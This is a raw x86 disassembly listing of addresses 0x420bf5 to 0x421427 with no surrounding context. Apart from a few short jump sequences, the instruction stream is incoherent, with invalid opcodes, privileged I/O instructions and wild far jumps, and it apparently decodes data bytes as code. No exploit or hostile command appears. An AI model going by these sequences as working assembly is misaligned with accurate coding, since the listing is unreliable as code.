  420bf5:	test   DWORD PTR [eax],ebp
  420bf7:	jge    0x420b7b
  420bf9:	sub    al,bl
  420bfb:	mov    ecx,0x3c1c4c97
  420c00:	mov    ecx,0x34ef978f
  420c05:	jno    0x420b9b
  420c07:	add    al,0xfe
  420c09:	mov    bl,0x9e
  420c0b:	pop    ds
  420c0c:	aaa    
  420c0d:	test   DWORD PTR [esi-0x71b3f4b],0xae3937af
  420c17:	jle    0x420bd5
  420c19:	push   ebx
  420c1a:	mov    ch,0xea
  420c1c:	test   eax,0xc6102b25
  420c21:	sbb    ah,al
  420c23:	mov    bh,BYTE PTR [edi+0x39562333]
  420c29:	lahf   
  420c2a:	inc    edx
  420c2b:	push   0xffffffd9
  420c2d:	pop    ss
  420c2e:	ja     0x420c11
  420c30:	xor    BYTE PTR [ebx+0x4f],cl
  420c33:	scas   eax,DWORD PTR es:[edi]
  420c34:	aad    0x3b
  420c36:	bnd ja 0x420c50
  420c39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c3a:	push   edx
  420c3b:	push   ss
  420c3c:	mov    bl,BYTE PTR [eax-0x31bc692f]
  420c42:	pushf  
  420c43:	cmp    ebx,eax
  420c45:	sbb    al,BYTE PTR [ebx-0xa]
  420c48:	mov    ebx,0xf2acd84
  420c4d:	sub    al,0x25
  420c4f:	popa   
  420c50:	in     eax,0x55
  420c52:	xor    ebp,DWORD PTR [ecx+edi*4+0x4b43bce2]
  420c59:	stos   DWORD PTR es:[edi],eax
  420c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c5b:	push   es
  420c5c:	ss out dx,al
  420c5e:	pop    ss
  420c5f:	pushf  
  420c60:	add    BYTE PTR [eax-0x7d],al
  420c63:	fsubr  st,st(5)
  420c65:	idiv   DWORD PTR [eax-0x528c3e9d]
  420c6b:	jg     0x420c7e
  420c6d:	rol    DWORD PTR [esi],1
  420c6f:	aad    0xb2
  420c71:	add    eax,0xe0e535dd
  420c76:	pop    ss
  420c77:	cli    
  420c78:	xchg   BYTE PTR [edx+0x2a],cl
  420c7b:	into   
  420c7c:	scas   eax,DWORD PTR es:[edi]
  420c7d:	wrmsr  
  420c7f:	adc    eax,0xf35c01ae
  420c84:	jl     0x420cf5
  420c86:	sub    DWORD PTR [edx+0x33],ecx
  420c89:	xchg   dl,ch
  420c8b:	inc    edi
  420c8c:	and    ebp,DWORD PTR [ebp-0x4e]
  420c8f:	lds    edx,FWORD PTR [ebx+edi*2-0x1a]
  420c93:	sub    eax,0x381a419f
  420c98:	dec    edi
  420c99:	inc    eax
  420c9a:	cmp    eax,0x49b2146c
  420c9f:	arpl   WORD PTR [ebx+0x17ff97d],di
  420ca5:	mov    WORD PTR [ebx-0x1a],ss
  420ca8:	(bad)  
  420ca9:	shl    BYTE PTR [ecx+eiz*1+0x49],cl
  420cad:	jbe    0x420cde
  420caf:	outs   dx,DWORD PTR ds:[esi]
  420cb0:	pop    ebp
  420cb1:	sub    eax,0x6c135b24
  420cb6:	jo     0x420d0d
  420cb8:	mov    ds,WORD PTR [ebx]
  420cba:	or     ch,BYTE PTR [edx]
  420cbc:	in     al,0xb
  420cbe:	ret    0xae62
  420cc1:	enter  0x71fd,0x45
  420cc5:	jecxz  0x420d14
  420cc7:	xchg   ebp,eax
  420cc8:	push   es
  420cc9:	push   0x67f820ca
  420cce:	sub    eax,0xef60e53f
  420cd3:	xchg   ebx,eax
  420cd4:	(bad)  
  420cd5:	or     al,0xf4
  420cd7:	pop    ebp
  420cd8:	shr    DWORD PTR [eax+0x550bc4c],cl
  420cde:	sbb    bl,ch
  420ce0:	add    eax,DWORD PTR ds:0xc3f484dd
  420ce6:	loop   0x420cbe
  420ce8:	xchg   esi,eax
  420ce9:	mov    edx,0x625fba37
  420cee:	or     edx,eax
  420cf0:	loop   0x420cf2
  420cf2:	push   edi
  420cf3:	dec    eax
  420cf4:	mov    ah,0xf7
  420cf6:	in     al,0x4e
  420cf8:	sbb    DWORD PTR [ebp-0x22e627d],ebp
  420cfe:	outs   dx,DWORD PTR ds:[esi]
  420cff:	jp     0x420cae
  420d01:	adc    DWORD PTR [eax],edx
  420d03:	(bad)  
  420d04:	mov    ds:0x59fafb5e,eax
  420d09:	in     eax,0xe8
  420d0b:	mov    dh,0xb2
  420d0d:	xor    BYTE PTR [edx+ebp*4-0x5e68cfb0],ch
  420d14:	fcom   DWORD PTR [ebp+0x2b3d4e35]
  420d1a:	fidiv  WORD PTR [ebp+0x87121f]
  420d20:	mov    al,0x88
  420d22:	xlat   BYTE PTR ds:[ebx]
  420d23:	push   eax
  420d24:	adc    ebx,esi
  420d26:	cmp    DWORD PTR [edx-0x6ee75113],ecx
  420d2c:	lock sub dh,BYTE PTR [ecx]
  420d2f:	aaa    
  420d30:	dec    esp
  420d31:	jmp    0x17562a66
  420d36:	mov    ds:0x1bf4202d,eax
  420d3b:	mov    esi,0xe0cf1cac
  420d40:	outs   dx,BYTE PTR ds:[esi]
  420d41:	jecxz  0x420cf6
  420d43:	(bad)  
  420d45:	sbb    eax,0x6f9258b5
  420d4a:	pop    ebx
  420d4b:	xor    cl,BYTE PTR [ebp+esi*2-0x4c6c411d]
  420d52:	push   esi
  420d53:	sbb    BYTE PTR [edi+eax*8+0x63169e5d],ch
  420d5a:	int    0xd0
  420d5c:	frstor [edx+0x5]
  420d5f:	(bad)  
  420d60:	mov    cl,0xcc
  420d62:	sbb    eax,0xb5f97cc8
  420d67:	adc    ebp,DWORD PTR [eax+0x6f0076e]
  420d6d:	xchg   esp,eax
  420d6e:	xchg   ecx,eax
  420d6f:	pushw  cs
  420d71:	idiv   DWORD PTR [edi+edi*4+0x343b879d]
  420d78:	pop    ebx
  420d79:	rol    bl,cl
  420d7b:	aas    
  420d7c:	cli    
  420d7d:	fidivr DWORD PTR [ebx-0x1bc7336c]
  420d83:	and    eax,0x3bd3d5c4
  420d88:	and    al,0xbf
  420d8a:	cdq    
  420d8b:	jo     0x420d20
  420d8d:	pop    eax
  420d8e:	call   DWORD PTR [edx+0x43]
  420d91:	jle    0x420dbc
  420d93:	push   ss
  420d94:	popf   
  420d95:	pop    eax
  420d96:	sbb    eax,0x3caa44f4
  420d9b:	sub    bh,BYTE PTR [edi-0x72dce61c]
  420da1:	sub    edi,DWORD PTR [esi+0x54bd0280]
  420da7:	pop    es
  420da8:	xchg   esp,eax
  420da9:	sar    edx,cl
  420dab:	mov    WORD PTR [ebx+0x7],?
  420dae:	gs xchg ebp,eax
  420db0:	icebp  
  420db1:	cmp    al,0x91
  420db3:	xchg   DWORD PTR [eax],edx
  420db5:	test   eax,0xec8d24c5
  420dba:	and    al,0x11
  420dbc:	mov    bh,BYTE PTR [edi]
  420dbe:	jb     0x420e11
  420dc0:	cmp    DWORD PTR [edx-0x74],ecx
  420dc3:	fbstp  TBYTE PTR [eax-0x5ecc952c]
  420dc9:	(bad)  
  420dcb:	mov    WORD PTR [edx-0x302485fa],fs
  420dd1:	or     eax,0x33b29bbf
  420dd6:	fnsave gs:[edi+0x46]
  420dda:	add    ecx,DWORD PTR [eax+0x7]
  420ddd:	xchg   edi,eax
  420dde:	push   eax
  420ddf:	inc    edx
  420de0:	inc    edx
  420de1:	bound  eax,QWORD PTR [eax]
  420de3:	int    0x53
  420de5:	in     al,0x5c
  420de7:	fsubr  DWORD PTR [ebp+edi*1+0xb]
  420deb:	test   DWORD PTR [ebp-0x61612a2e],ecx
  420df1:	loopne 0x420d90
  420df3:	cwde   
  420df4:	mov    edi,0x99ea163b
  420df9:	ret    0xf05
  420dfc:	sbb    ecx,ebx
  420dfe:	mov    dh,0x27
  420e00:	in     al,0xd5
  420e02:	jo     0x420e27
  420e04:	pop    ebx
  420e05:	mov    esp,0xabf066c6
  420e0a:	mov    eax,ds:0xe8c77588
  420e0f:	inc    ebx
  420e10:	xchg   edx,eax
  420e11:	out    0xc1,eax
  420e13:	ror    DWORD PTR [edx-0x744521b9],1
  420e19:	cmp    bl,BYTE PTR [ebx-0x1e47988]
  420e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e20:	lods   al,BYTE PTR ds:[esi]
  420e21:	mov    ds:0xa6be8265,eax
  420e26:	test   eax,0x6bf68966
  420e2b:	jb     0x420e6a
  420e2d:	lea    esp,[ebx-0x54]
  420e30:	dec    esp
  420e31:	mov    edi,0xef4d1b4
  420e36:	inc    eax
  420e37:	sub    BYTE PTR [esi-0x15dbf41d],bh
  420e3d:	inc    eax
  420e3e:	in     al,dx
  420e3f:	dec    esp
  420e40:	or     al,0xaa
  420e42:	rcr    al,0xe8
  420e45:	mov    ds:0xeee4ebdb,al
  420e4a:	mov    al,0x49
  420e4c:	mov    bl,0xee
  420e4e:	enter  0x4dfc,0x58
  420e52:	sahf   
  420e53:	push   0x20d2c251
  420e58:	cli    
  420e59:	xor    esp,DWORD PTR [edi]
  420e5b:	add    DWORD PTR [eax],edi
  420e5d:	inc    ecx
  420e5e:	xlat   BYTE PTR ds:[ebx]
  420e5f:	mov    edi,0x13801fa1
  420e64:	and    eax,0xa690ae67
  420e69:	mov    ebx,0xc135d18d
  420e6e:	cld    
  420e6f:	ret    0x9431
  420e72:	push   ss
  420e73:	cmp    al,0x4c
  420e75:	imul   edx,DWORD PTR [edi-0x23],0x78
  420e79:	and    esi,DWORD PTR [edx]
  420e7b:	and    eax,0xf9421091
  420e80:	mov    ch,BYTE PTR [eax]
  420e82:	nop
  420e83:	push   cs
  420e84:	(bad)  
  420e85:	push   esi
  420e86:	pop    esp
  420e87:	lahf   
  420e88:	cmp    dl,BYTE PTR [ebp+0x3452f81d]
  420e8e:	(bad)  ss:[ecx]
  420e92:	and    al,0xc1
  420e94:	outs   dx,DWORD PTR ds:[esi]
  420e95:	das    
  420e96:	or     al,0x3e
  420e98:	fnstcw WORD PTR [esi]
  420e9a:	push   edx
  420e9b:	cs mov dh,0xa9
  420e9e:	call   0x8635:0x53fb451b
  420ea5:	ror    DWORD PTR ds:0xcde1cfbe,cl
  420eab:	into   
  420eac:	xchg   DWORD PTR [edx-0x4155711c],ecx
  420eb2:	test   eax,0x1cdd4a52
  420eb7:	and    al,0xee
  420eb9:	setge  cl
  420ebc:	sbb    DWORD PTR gs:0x661e72eb,esi
  420ec3:	pop    ss
  420ec4:	xchg   edi,eax
  420ec5:	xor    eax,0xc4607c76
  420eca:	sub    ebx,DWORD PTR [ecx]
  420ecc:	(bad)  
  420ecd:	(bad)  
  420ece:	ins    DWORD PTR es:[edi],dx
  420ecf:	push   ebp
  420ed0:	mov    esi,0x5689542
  420ed5:	mov    bl,0xf6
  420ed7:	adc    cl,BYTE PTR [ebx-0x25c484d5]
  420edd:	ja     0x420eeb
  420ee3:	mov    edx,DWORD PTR [ebp-0x30]
  420ee6:	jmp    0x422873
  420eeb:	mov    edx,DWORD PTR [ebp-0x38]
  420eee:	jmp    0x421400
  420ef3:	leave  
  420ef4:	mov    eax,0xc9cbcacb
  420efa:	lds    esp,FWORD PTR [edi-0x108d0891]
  420f00:	aaa    
  420f01:	repz das 
  420f03:	or     esp,DWORD PTR [edi+0x7f]
  420f06:	js     0x420f7b
  420f08:	jl     0x420f82
  420f0a:	js     0x420f0a
  420f0c:	add    BYTE PTR [edi+ebx*1-0x70],al
  420f10:	aam    0xb0
  420f12:	div    DWORD PTR [esi+0x2a]
  420f15:	ja     0x420ec0
  420f17:	pop    esi
  420f18:	pop    es
  420f19:	mov    bl,0xaa
  420f1b:	cli    
  420f1c:	fadd   QWORD PTR [edx+0x4a9624e0]
  420f22:	push   edi
  420f23:	push   edi
  420f24:	mov    ebx,0x55adcdf7
  420f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f2a:	test   eax,0xe9deca05
  420f2f:	call   0x2d85:0x56ba75c5
  420f36:	sahf   
  420f37:	push   ds
  420f38:	outs   dx,BYTE PTR ds:[esi]
  420f39:	push   esi
  420f3a:	mov    al,ds:0x9cbe35a3
  420f3f:	fdivr  DWORD PTR [ecx-0x7]
  420f42:	add    BYTE PTR [ebx+0x2a8a1d7f],0xc4
  420f49:	or     edx,edx
  420f4b:	mov    eax,ds:0x813c598f
  420f50:	xchg   esi,eax
  420f51:	pop    ebp
  420f52:	xor    DWORD PTR [edi-0x66c55764],ecx
  420f58:	push   0x64a9e74f
  420f5d:	or     al,0x5c
  420f5f:	fsub   QWORD PTR [ecx-0x7af76412]
  420f65:	and    al,0x60
  420f67:	adc    BYTE PTR [eax+0xe],bl
  420f6a:	cmp    BYTE PTR ds:0x886f32de,0x7b
  420f71:	js     0x420fd2
  420f73:	or     edx,DWORD PTR [edx]
  420f75:	mov    ebp,0x4cf7fca7
  420f7a:	mov    ecx,0x17478f42
  420f7f:	jns    0x420f51
  420f81:	cmc    
  420f82:	(bad)  
  420f84:	inc    esi
  420f85:	mov    eax,ds:0x615b9b0a
  420f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f8b:	aas    
  420f8c:	(bad)  
  420f8d:	adc    DWORD PTR [esi+0x56],edx
  420f90:	push   ss
  420f91:	test   eax,0x48e6e23d
  420f96:	ds mov bl,0xc3
  420f99:	repz in eax,0xc8
  420f9c:	push   esp
  420f9d:	imul   ecx,DWORD PTR [edi-0x65953345],0xb
  420fa4:	leave  
  420fa5:	ds xor eax,0x6b2d20c3
  420fab:	cli    
  420fac:	cmc    
  420fad:	mov    esp,0xf7280d91
  420fb2:	sub    DWORD PTR [edi-0x420bdca5],ebx
  420fb8:	jo     0x420fe0
  420fba:	lods   al,BYTE PTR ds:[esi]
  420fbb:	mov    ebp,fs
  420fbd:	cmp    ecx,ecx
  420fbf:	retf   0xeebf
  420fc2:	in     al,0x67
  420fc4:	add    eax,DWORD PTR ds:0x3af5f0b0
  420fca:	add    al,0xd6
  420fcc:	add    DWORD PTR [esi+ebx*2-0x76a42884],esi
  420fd3:	mov    esi,0xd4733a23
  420fd8:	xor    BYTE PTR [ecx+0x2f7de86c],dl
  420fde:	mov    dh,0xf
  420fe0:	cmc    
  420fe1:	xor    DWORD PTR [esi-0x589e55e0],eax
  420fe7:	shr    DWORD PTR [edi],cl
  420fe9:	scas   eax,DWORD PTR es:[edi]
  420fea:	pop    esi
  420feb:	sub    edi,DWORD PTR [edx]
  420fed:	sbb    DWORD PTR ds:0x695b7efd,eax
  420ff3:	sbb    BYTE PTR [eax+0x692005ef],dh
  420ff9:	ja     0x420fe8
  420ffb:	push   ebx
  420ffc:	xor    eax,0x9722b321
  421001:	add    al,0xd6
  421003:	aad    0x4b
  421005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421006:	pop    edi
  421007:	pop    esp
  421008:	cs dec ebx
  42100a:	daa    
  42100b:	or     cl,BYTE PTR [ebp+edi*8+0x22]
  42100f:	pop    ebp
  421010:	cmp    dh,BYTE PTR [edi]
  421012:	jge    0x420fbc
  421014:	xor    eax,0x2977cd47
  421019:	dec    ecx
  42101a:	popf   
  42101b:	inc    esp
  42101c:	retf   
  42101d:	cli    
  42101e:	jmp    0xb437:0x6a6f3947
  421025:	push   ebp
  421026:	jle    0x420ffb
  421028:	xor    BYTE PTR [eax],dl
  42102a:	in     al,0xb5
  42102c:	pop    ecx
  42102d:	mov    fs,WORD PTR [edx-0x15]
  421030:	or     bh,BYTE PTR fs:[edi]
  421033:	outs   dx,BYTE PTR ds:[esi]
  421034:	outs   dx,DWORD PTR ds:[esi]
  421035:	pushf  
  421036:	pop    edi
  421037:	das    
  421038:	pop    ss
  421039:	gs dec esp
  42103b:	mov    cl,0x37
  42103d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42103e:	test   BYTE PTR [edx],ch
  421040:	cs enter 0xd8e2,0x97
  421045:	sbb    eax,0x254151b7
  42104a:	into   
  42104b:	test   al,0xc0
  42104d:	fsub   DWORD PTR [ebp+ebx*4+0x7c8c8874]
  421054:	and    eax,0x4d063f18
  421059:	inc    ecx
  42105a:	jbe    0x42103d
  42105c:	ret    0x3c63
  42105f:	std    
  421060:	daa    
  421061:	(bad)  
  421063:	popa   
  421064:	mov    BYTE PTR [ebx],dh
  421066:	jb     0x4210bb
  421068:	jp     0x4210bb
  42106a:	mul    BYTE PTR [edx]
  42106c:	push   ds
  42106d:	fiadd  DWORD PTR [edi-0x5b]
  421070:	jns    0x4210c7
  421072:	fs loope 0x42101b
  421075:	imul   bx,WORD PTR ds:0x52294f94,0xff89
  42107d:	inc    ecx
  42107e:	fisttp QWORD PTR [ebx+0x28]
  421081:	add    ecx,DWORD PTR [esi+0x4885e7bf]
  421087:	mov    ds:0xfcdb1236,al
  42108c:	(bad)  
  42108d:	popa   
  42108e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42108f:	and    edx,DWORD PTR [ebp+edx*2+0x59]
  421093:	aad    0x7c
  421095:	sub    al,0xc2
  421097:	mov    gs,WORD PTR [edi+0x36]
  42109a:	ror    DWORD PTR [edi],cl
  42109c:	lea    edx,[ecx]
  42109e:	data16 out dx,al
  4210a0:	hlt    
  4210a1:	pop    ebx
  4210a2:	mov    cx,0xb3de
  4210a6:	or     BYTE PTR ds:0xfa48cf52,dh
  4210ac:	sub    edx,DWORD PTR [ecx-0x799ef59c]
  4210b2:	int3   
  4210b3:	xchg   esp,eax
  4210b4:	xchg   edx,eax
  4210b5:	push   0x3f
  4210b7:	(bad)  
  4210b8:	jno    0x42109f
  4210ba:	pushf  
  4210bb:	aaa    
  4210bc:	shl    BYTE PTR [ebx],0x44
  4210bf:	sbb    al,0x55
  4210c1:	xchg   edx,eax
  4210c2:	enter  0xc3b6,0x32
  4210c6:	push   ebp
  4210c7:	stc    
  4210c8:	dec    esp
  4210c9:	mov    cl,0xf9
  4210cb:	arpl   WORD PTR [ebp-0x1d],sp
  4210ce:	adc    ecx,DWORD PTR [ebx+0x19]
  4210d1:	stos   DWORD PTR es:[edi],eax
  4210d2:	mov    dl,0x17
  4210d5:	inc    edx
  4210d6:	addr16 or bh,ch
  4210d9:	es push es
  4210db:	pop    edi
  4210dc:	ficom  DWORD PTR [edi]
  4210de:	xor    al,0x5f
  4210e0:	push   ds
  4210e1:	mov    al,0x57
  4210e3:	and    eax,0xe3190685
  4210e8:	loop   0x42109b
  4210ea:	stos   DWORD PTR es:[edi],eax
  4210eb:	popa   
  4210ec:	pop    es
  4210ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210ee:	push   edi
  4210ef:	jmp    0x1e154992
  4210f4:	out    dx,al
  4210f5:	push   esi
  4210f6:	xchg   edi,eax
  4210f7:	mov    esp,0x7f4fc259
  4210fc:	add    BYTE PTR [edx-0x624537bf],0x8e
  421103:	jle    0x421171
  421105:	cmp    al,0x15
  421107:	mov    cl,0x9b
  421109:	sbb    BYTE PTR [ebx-0x42df658b],ch
  42110f:	test   DWORD PTR [ebp-0x16dd041b],esi
  421115:	lea    ecx,[edi+0x18]
  421118:	mov    eax,0x5b6e655a
  42111d:	and    DWORD PTR [edx-0x1309f4f9],edi
  421123:	das    
  421124:	jl     0x4210be
  421126:	mov    esp,0x69211947
  42112b:	int3   
  42112c:	(bad)  
  42112d:	test   DWORD PTR [esi-0x2a],esi
  421130:	xchg   ebx,eax
  421131:	mov    ah,0x1e
  421133:	push   ds
  421134:	or     al,0xd4
  421136:	xor    edx,DWORD PTR [esi+0xc1f9e27]
  42113c:	dec    esp
  42113d:	leave  
  42113e:	fucomp st(0)
  421140:	mov    bh,0x7d
  421142:	adc    al,0xaa
  421144:	repnz pop esp
  421146:	repnz mul edi
  421149:	mov    DWORD PTR [edx],edi
  42114b:	retf   
  42114c:	stos   BYTE PTR es:[edi],al
  42114d:	je     0x4210dd
  42114f:	cmp    BYTE PTR [esi+ebp*8],al
  421152:	cli    
  421153:	test   eax,0xce034e7b
  421158:	push   0xf2068c81
  42115d:	mov    ebx,0x4ed921d
  421162:	aam    0x72
  421164:	jae    0x42112a
  421166:	sbb    edx,DWORD PTR [ecx+0x49f346c]
  42116c:	loope  0x421126
  42116e:	(bad)  
  421170:	ficom  DWORD PTR [esi]
  421172:	fs xchg edi,eax
  421174:	test   al,0x72
  421176:	fs jmp 0x4211a8
  421179:	adc    edx,DWORD PTR [ebx+0x7312a2c4]
  42117f:	mov    eax,ds:0x46fe80d8
  421184:	jmp    0x421157
  421186:	adc    DWORD PTR [esi+0x7aea5b59],ecx
  42118c:	inc    edx
  42118d:	jnp    0x421168
  42118f:	pop    ebx
  421190:	mov    ebx,0x8ea4b4c9
  421195:	adc    ch,dl
  421197:	lahf   
  421198:	lods   eax,DWORD PTR ds:[esi]
  421199:	jp     0x421190
  42119b:	push   ds
  42119c:	cli    
  42119d:	xchg   edx,eax
  42119e:	dec    ebx
  42119f:	mov    edi,0xb2eeea86
  4211a4:	sahf   
  4211a5:	popf   
  4211a6:	sar    DWORD PTR [edi+0x6d056f86],0xfd
  4211ad:	fcom   QWORD PTR [edx-0xe]
  4211b0:	or     eax,0xd1df8d19
  4211b5:	add    eax,0xc3bfccb6
  4211ba:	aaa    
  4211bb:	jmp    0x53ef:0xe49c
  4211c1:	mov    ch,BYTE PTR [ebp-0x19]
  4211c4:	sbb    BYTE PTR [edi-0x1d],0x6b
  4211c8:	inc    ecx
  4211c9:	push   0xa4e83c87
  4211ce:	fld    QWORD PTR [ebp-0x2f9640]
  4211d4:	xor    BYTE PTR [ecx],ah
  4211d6:	pop    es
  4211d7:	push   ecx
  4211d8:	mov    al,ds:0x9977145c
  4211dd:	mov    ebp,0xbee02022
  4211e2:	inc    ecx
  4211e3:	popf   
  4211e4:	imul   esp,ebp,0x62cbf2e3
  4211ea:	jl     0x421194
  4211ec:	mov    ah,0xf0
  4211ee:	and    DWORD PTR [ebx],esp
  4211f0:	mov    edi,0xfe51c136
  4211f5:	out    0xf,eax
  4211f7:	out    dx,eax
  4211f8:	stos   BYTE PTR es:[edi],al
  4211f9:	jae    0x4211c4
  4211fb:	push   0xb3104348
  421200:	mov    eax,ds:0x6e91783e
  421205:	xor    ecx,DWORD PTR [ebp-0x7f]
  421208:	(bad)  
  421209:	repnz repz mov bh,BYTE PTR [ecx-0xdc23d0c]
  421211:	jp     0x421243
  421213:	test   edx,edi
  421215:	pop    edx
  421216:	adc    bl,al
  421218:	hlt    
  421219:	into   
  42121a:	ror    ebx,1
  42121c:	or     ch,ch
  42121e:	retf   
  42121f:	sbb    eax,0x947299c
  421224:	mov    ebp,DWORD PTR [edi]
  421226:	in     eax,dx
  421227:	mov    bh,0x2f
  421229:	pushf  
  42122a:	and    ebp,edx
  42122c:	inc    BYTE PTR [edx+0x2fce15e2]
  421232:	imul   esp,DWORD PTR [edi+eiz*8-0x1df1790],0x5817ba6f
  42123d:	xchg   DWORD PTR [ebx+0x25c900f6],ecx
  421243:	test   BYTE PTR [esi],dh
  421245:	jbe    0x4211cc
  421247:	or     DWORD PTR [esi-0x3d95632b],ebx
  42124d:	repz mov edi,0xdb5b0855
  421253:	cmc    
  421254:	pushf  
  421255:	lods   eax,DWORD PTR ds:[esi]
  421256:	call   0x621e:0xea5057d0
  42125d:	inc    edx
  42125e:	sti    
  42125f:	pop    ss
  421260:	sub    bl,BYTE PTR [edx]
  421262:	shl    ch,0xad
  421265:	adc    BYTE PTR [ecx-0x4f],dh
  421268:	aad    0x39
  42126a:	test   eax,0x6cda207
  42126f:	fbstp  TBYTE PTR [ebx]
  421271:	mov    eax,0xc019bdbf
  421276:	adc    ch,BYTE PTR [ebx+0x75]
  421279:	repz (bad) 
  42127b:	stos   DWORD PTR es:[edi],eax
  42127c:	push   es
  42127d:	or     bl,BYTE PTR [ebp+0xc]
  421280:	pusha  
  421281:	(bad)  
  421282:	mov    al,0x29
  421284:	das    
  421285:	mov    DWORD PTR [edx],0x16618bc3
  42128b:	pop    ecx
  42128c:	dec    esp
  42128d:	mov    esp,0xa60e7342
  421292:	out    dx,al
  421293:	cmp    ch,BYTE PTR [ebp-0x6a]
  421296:	add    ah,bl
  421298:	mov    BYTE PTR [edi+eax*4-0x4258e23f],dh
  42129f:	mov    al,0xc9
  4212a1:	xchg   esp,eax
  4212a2:	pop    edx
  4212a3:	or     bl,BYTE PTR [eax-0x40cd4c8c]
  4212a9:	test   al,0x7
  4212ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212ac:	mov    eax,DWORD PTR ds:0x11b33567
  4212b2:	push   eax
  4212b4:	cmp    DWORD PTR [ebx-0x78],ecx
  4212b7:	clc    
  4212b8:	popa   
  4212b9:	addr16 mov bl,cl
  4212bc:	sub    al,0x85
  4212be:	repnz or DWORD PTR [ebx+0x2d],esi
  4212c2:	pop    ebp
  4212c3:	ror    BYTE PTR [edi+0x4cc1bf8d],cl
  4212c9:	repz (bad) [esi+0xc]
  4212cd:	xor    DWORD PTR [edx+esi*8-0x3fa4bf2a],edx
  4212d4:	xor    ch,BYTE PTR [ebx+0x476543a3]
  4212da:	dec    ebp
  4212db:	xor    bh,BYTE PTR [ebx+0x8]
  4212de:	xchg   esi,eax
  4212df:	rcr    DWORD PTR gs:[eax+ebx*2],0xe2
  4212e4:	in     eax,dx
  4212e5:	out    dx,eax
  4212e6:	ds mov ecx,0xa953aa1
  4212ec:	xor    dh,ch
  4212ee:	es jmp 0x4212d7
  4212f1:	add    ebx,DWORD PTR [edi+0x69]
  4212f4:	das    
  4212f5:	cmp    BYTE PTR [ecx+0x56],cl
  4212f8:	cmp    DWORD PTR [esi+0x5b],esp
  4212fb:	sbb    cl,0xa1
  4212fe:	pop    esp
  4212ff:	dec    DWORD PTR [esi]
  421301:	loop   0x42129a
  421303:	loope  0x421319
  421305:	js     0x421328
  421307:	xchg   esi,eax
  421308:	xchg   edi,eax
  421309:	call   0x28ac:0x520e8026
  421310:	int    0x7d
  421312:	cmp    DWORD PTR [ebx-0x6315b2e9],esi
  421318:	add    DWORD PTR [edx-0x42389a80],edi
  42131e:	shr    DWORD PTR [eax],0x8d
  421321:	adc    eax,DWORD PTR [ecx-0x616e2440]
  421327:	rol    BYTE PTR [esi-0x7f],1
  42132a:	pop    esi
  42132b:	mov    ds:0x4243b0a5,eax
  421330:	pop    edi
  421331:	inc    esi
  421332:	outs   dx,DWORD PTR ds:[esi]
  421333:	retf   
  421334:	(bad)  
  421335:	data16 mov ds:0x89dd030f,al
  42133b:	inc    esi
  42133c:	loope  0x421371
  42133e:	rcl    BYTE PTR [edx+0xd],1
  421341:	(bad)  
  421342:	pop    es
  421343:	cmp    eax,0x656a20b8
  421348:	jmp    0xc5c:0xf96d1217
  42134f:	test   eax,0xfef0288c
  421354:	fwait
  421355:	add    eax,0x7d36a531
  42135a:	cmp    ah,BYTE PTR [edx+0x3b91c83]
  421360:	xor    al,0x4c
  421362:	or     eax,0xd2900da8
  421367:	sbb    eax,DWORD PTR [ebx]
  421369:	ficomp WORD PTR [esi-0x1700c280]
  42136f:	sbb    al,0xe
  421371:	iret   
  421372:	adc    ah,BYTE PTR [edx+ebp*2]
  421375:	int3   
  421376:	adc    bl,cl
  421378:	dec    ebx
  421379:	xor    dh,al
  42137b:	test   DWORD PTR [edi+esi*4-0xac33cf1],edi
  421382:	sbb    ah,dh
  421384:	jle    0x421330
  421386:	pop    ds
  421387:	cwde   
  421388:	fcom   QWORD PTR [ebx+0x74]
  42138b:	cli    
  42138c:	inc    edi
  42138d:	loope  0x4213c2
  42138f:	xlat   BYTE PTR ds:[ebx]
  421390:	dec    edx
  421391:	and    DWORD PTR [ebp+0x994f801],ebp
  421397:	sbb    eax,0xdad94c18
  42139c:	mov    ch,dl
  42139e:	inc    ebp
  42139f:	pop    edx
  4213a0:	jp     0x421350
  4213a2:	retf   
  4213a3:	fnsave [ebx]
  4213a5:	xchg   edx,eax
  4213a6:	call   0xad12:0x98f208c2
  4213ad:	pushf  
  4213ae:	js     0x4213c0
  4213b0:	repz jb 0x421397
  4213b3:	or     edx,DWORD PTR [esp+eax*8]
  4213b6:	pop    ebp
  4213b7:	enter  0x73a9,0x5a
  4213bb:	pop    esi
  4213bc:	js     0x4213fc
  4213be:	mov    edx,DWORD PTR [edx-0x3da52877]
  4213c4:	jle    0x4213b3
  4213c6:	jl     0x42142f
  4213c8:	xor    esi,0xbc2feaf0
  4213ce:	mov    ah,0xa3
  4213d0:	popa   
  4213d1:	xor    bl,dl
  4213d3:	cmc    
  4213d4:	push   ecx
  4213d5:	mov    dh,0xc4
  4213d7:	jns    0x421361
  4213d9:	push   ss
  4213da:	mov    ch,0x46
  4213dc:	popa   
  4213dd:	sub    ch,ch
  4213df:	add    edi,DWORD PTR [esi-0x4]
  4213e2:	dec    esi
  4213e3:	int3   
  4213e4:	daa    
  4213e5:	das    
  4213e6:	and    eax,0x4b066abc
  4213eb:	stos   DWORD PTR es:[edi],eax
  4213ec:	leave  
  4213ed:	sbb    ebp,DWORD PTR [edx]
  4213ef:	stos   DWORD PTR es:[di],eax
  4213f1:	rol    BYTE PTR [esi-0x78659f57],0x84
  4213f8:	mov    ?,eax
  4213fa:	xchg   ebx,eax
  4213fb:	imul   edx,esi,0xffffffd9
  4213fe:	pop    edx
  4213ff:	pop    ecx
  421400:	mov    edi,DWORD PTR [ebp-0x4]
  421403:	xor    edx,eax
  421405:	jmp    0x421917
  42140a:	rcl    edx,1
  42140c:	(bad)  
  42140d:	leave  
  42140e:	aad    0xc9
  421410:	rcr    edx,1
  421412:	or     eax,0xf3072fb9
  421417:	loopne 0x421449
  421419:	inc    eax
  42141a:	jle    0x421486
  42141c:	jg     0x421496
  42141e:	jae    0x42149c
  421420:	js     0x42149a
  421422:	cmp    DWORD PTR [eax],eax
  421424:	pop    ebx
  421425:	cmp    eax,edx
  421427:	es out 0xb2,al
